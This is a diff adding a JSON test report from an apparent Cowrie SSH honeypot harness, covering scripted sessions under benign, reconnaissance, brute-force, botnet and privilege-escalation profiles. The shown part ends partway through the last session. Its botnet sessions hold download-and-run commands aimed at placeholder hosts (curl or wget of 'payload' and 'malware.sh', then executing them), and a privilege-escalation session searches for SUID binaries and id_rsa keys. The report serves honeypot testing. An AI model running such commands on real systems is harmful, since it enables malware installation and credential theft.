@@ -1,0 +1,2307 @@
+{
+  "cowrie_sessions": 28,
+  "manifest_attempts": 28,
+  "pairing": "all usernames/passwords matched",
+  "sessions_with_problems": [
+    "bea9802d50a4",
+    "e209f8a07f2f"
+  ],
+  "logged_in_sessions": [
+    {
+      "session": "17425ebe1dc2",
+      "profile": "benign_admin",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 8.5,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "w",
+        "du -sh /var/log",
+        "cat /proc/meminfo",
+        "pwd",
+        "tail -n 50 /var/log/syslog"
+      ],
+      "commands_sent": [
+        "w",
+        "du -sh /var/log",
+        "cat /proc/meminfo",
+        "pwd",
+        "tail -n 50 /var/log/syslog"
+      ],
+      "cowrie_command_input": [
+        "w",
+        "du -sh /var/log",
+        "cat /proc/meminfo",
+        "pwd",
+        "tail -n 50 /var/log/syslog",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "w",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.11,
+          "readiness_reason": "prompt",
+          "prompt_match": "ubuntu@svr04:~$ ",
+          "output_chars": 215,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "du -sh /var/log",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "ubuntu@svr04:~$ ",
+          "output_chars": 42,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "cat /proc/meminfo",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "ubuntu@svr04:~$ ",
+          "output_chars": 1204,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "pwd",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "ubuntu@svr04:~$ ",
+          "output_chars": 33,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "tail -n 50 /var/log/syslog",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "ubuntu@svr04:~$ ",
+          "output_chars": 43,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 302,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 215,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 42,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 1204,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 33,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 43,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 1892
+    },
+    {
+      "session": "260e705a84f1",
+      "profile": "benign_admin",
+      "manifest_index": 2,
+      "attempt": 2,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 17.6,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "who",
+        "date",
+        "df -h",
+        "systemctl status ssh",
+        "date",
+        "pwd"
+      ],
+      "commands_sent": [
+        "who",
+        "date",
+        "df -h",
+        "systemctl status ssh",
+        "date",
+        "pwd"
+      ],
+      "cowrie_command_input": [
+        "who",
+        "date",
+        "df -h",
+        "systemctl status ssh",
+        "date",
+        "pwd",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [
+        "systemctl status ssh"
+      ],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "who",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "deploy@svr04:~$ ",
+          "output_chars": 72,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "date",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "deploy@svr04:~$ ",
+          "output_chars": 50,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "df -h",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "deploy@svr04:~$ ",
+          "output_chars": 612,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "systemctl status ssh",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "deploy@svr04:~$ ",
+          "output_chars": 73,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "date",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "deploy@svr04:~$ ",
+          "output_chars": 50,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 6,
+          "command": "pwd",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "deploy@svr04:~$ ",
+          "output_chars": 33,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 302,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 72,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 50,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 612,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 73,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 50,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 6,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 33,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 1245
+    },
+    {
+      "session": "b4935be3f118",
+      "profile": "reconnaissance",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 18.9,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "id",
+        "uname -r",
+        "cat /etc/group",
+        "ls -la",
+        "ps aux",
+        "pwd",
+        "lscpu"
+      ],
+      "commands_sent": [
+        "id",
+        "uname -r",
+        "cat /etc/group",
+        "ls -la",
+        "ps aux",
+        "pwd",
+        "lscpu"
+      ],
+      "cowrie_command_input": [
+        "id",
+        "uname -r",
+        "cat /etc/group",
+        "ls -la",
+        "ps aux",
+        "pwd",
+        "lscpu",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "id",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 65,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "uname -r",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.046,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 37,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "cat /etc/group",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 567,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "ls -la",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 116,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "ps aux",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 6258,
+          "output_truncated": true,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 6,
+          "command": "pwd",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 29,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 7,
+          "command": "lscpu",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "user@svr04:~$ ",
+          "output_chars": 617,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 300,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 65,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 37,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 567,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 116,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": true,
+          "output_chars": 6258,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 6,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 29,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 7,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 617,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 8058
+    },
+    {
+      "session": "985afe58600f",
+      "profile": "reconnaissance",
+      "manifest_index": 2,
+      "attempt": 3,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 9.0,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "whoami",
+        "uname -a",
+        "ifconfig",
+        "ls"
+      ],
+      "commands_sent": [
+        "whoami",
+        "uname -a",
+        "ifconfig",
+        "ls"
+      ],
+      "cowrie_command_input": [
+        "whoami",
+        "uname -a",
+        "ifconfig",
+        "ls",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "whoami",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 26,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "uname -a",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 96,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "ifconfig",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 926,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "ls",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "root@svr04:~# ",
+          "output_chars": 17,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 300,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 26,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 96,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 926,
+          "password_leaks": [],
+          "redacted_markers": 0
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 17,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 1410
+    },
+    {
+      "session": "7cc795c63b60",
+      "profile": "brute_force",
+      "manifest_index": 1,
+      "attempt": 4,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 2.8,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [],
+      "commands_sent": [],
+      "cowrie_command_input": [
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 302,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 315
+    },
+    {
+      "session": "0a0cb1067322",
+      "profile": "brute_force",
+      "manifest_index": 2,
+      "attempt": 4,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 2.2,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [],
+      "commands_sent": [],
+      "cowrie_command_input": [
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": true,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 302,
+          "password_leaks": [],
+          "redacted_markers": 0
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 315
+    },
+    {
+      "session": "bea9802d50a4",
+      "profile": "botnet",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 21.8,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "shell",
+        "cd /var/tmp",
+        "curl -O http://pkg-repo.example/payload",
+        "system",
+        "chmod +x payload",
+        "sh payload"
+      ],
+      "commands_sent": [
+        "shell",
+        "cd /var/tmp",
+        "curl -O http://pkg-repo.example/payload",
+        "system",
+        "chmod +x payload",
+        "sh payload"
+      ],
+      "cowrie_command_input": [
+        "shell",
+        "cd /var/tmp",
+        "curl -O http://pkg-repo.example/payload",
+        "system",
+        "chmod +x payload",
+        "sh payload",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [
+        "shell ",
+        "system "
+      ],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "shell",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:~$ ",
+          "output_chars": 53,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "cd /var/tmp",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/var/tmp$ ",
+          "output_chars": 34,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "curl -O http://pkg-repo.example/payload",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/var/tmp$ ",
+          "output_chars": 113,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "system",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/var/tmp$ ",
+          "output_chars": 62,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "chmod +x payload",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/var/tmp$ ",
+          "output_chars": 97,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 6,
+          "command": "sh payload",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/var/tmp$ ",
+          "output_chars": 74,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 301,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 53,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 34,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 113,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 62,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 97,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 6,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 74,
+          "password_leaks": [],
+          "redacted_markers": 1
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 779
+    },
+    {
+      "session": "e209f8a07f2f",
+      "profile": "botnet",
+      "manifest_index": 2,
+      "attempt": 3,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 22.2,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "cd /tmp",
+        "shell",
+        "wget http://mirror.example/malware.sh",
+        "chmod 777 malware.sh",
+        "./malware.sh"
+      ],
+      "commands_sent": [
+        "cd /tmp",
+        "shell",
+        "wget http://mirror.example/malware.sh",
+        "chmod 777 malware.sh",
+        "./malware.sh"
+      ],
+      "cowrie_command_input": [
+        "cd /tmp",
+        "shell",
+        "wget http://mirror.example/malware.sh",
+        "chmod 777 malware.sh",
+        "./malware.sh",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [
+        "shell ",
+        "./malware.sh "
+      ],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "cd /tmp",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/tmp$ ",
+          "output_chars": 26,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "shell",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/tmp$ ",
+          "output_chars": 56,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "wget http://mirror.example/malware.sh",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/tmp$ ",
+          "output_chars": 259,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 4,
+          "command": "chmod 777 malware.sh",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/tmp$ ",
+          "output_chars": 100,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 5,
+          "command": "./malware.sh",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "admin@svr04:/tmp$ ",
+          "output_chars": 70,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        }
+      ],
+      "terminal_checks": [
+        {
+          "step": "initial",
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 301,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 1,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 26,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 2,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 56,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 3,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 259,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 4,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 100,
+          "password_leaks": [],
+          "redacted_markers": 1
+        },
+        {
+          "step": 5,
+          "reason": "prompt",
+          "evidence_consistent": false,
+          "bound_ok": true,
+          "truncation_flag_ok": true,
+          "truncated": false,
+          "output_chars": 70,
+          "password_leaks": [],
+          "redacted_markers": 1
+        }
+      ],
+      "manifest_output_chars_match_terminal_file": true,
+      "tty_output_bytes": 853
+    },
+    {
+      "session": "2ce8a7c9c5a3",
+      "profile": "privilege_escalation",
+      "manifest_index": 1,
+      "attempt": 1,
+      "cowrie_login": "success",
+      "cowrie_duration_s": 28.9,
+      "final_event": "cowrie.session.closed",
+      "manifest_status": "ok",
+      "termination": "clean_exit",
+      "shell_ready_initial": true,
+      "exit_sent": true,
+      "exit_confirmed": true,
+      "exit_in_cowrie": true,
+      "commands_planned": [
+        "whoami",
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "ls -la",
+        "find / -name id_rsa 2>/dev/null"
+      ],
+      "commands_sent": [
+        "whoami",
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "ls -la",
+        "find / -name id_rsa 2>/dev/null"
+      ],
+      "cowrie_command_input": [
+        "whoami",
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "ls -la",
+        "find / -name id_rsa 2>/dev/null",
+        "exit"
+      ],
+      "order_matches": true,
+      "sent_but_not_recorded": [],
+      "recorded_but_not_sent": [],
+      "cowrie_command_failed": [],
+      "cowrie_download_events": [],
+      "per_command": [
+        {
+          "seq": 1,
+          "command": "whoami",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.062,
+          "readiness_reason": "prompt",
+          "prompt_match": "www-data@svr04:/$ ",
+          "output_chars": 34,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 2,
+          "command": "sudo -l",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.047,
+          "readiness_reason": "prompt",
+          "prompt_match": "www-data@svr04:/$ ",
+          "output_chars": 683,
+          "output_truncated": false,
+          "status": "prompt_returned"
+        },
+        {
+          "seq": 3,
+          "command": "find / -perm -4000 -type f 2>/dev/null",
+          "sent": true,
+          "prompt_returned": true,
+          "wait_s": 0.063,
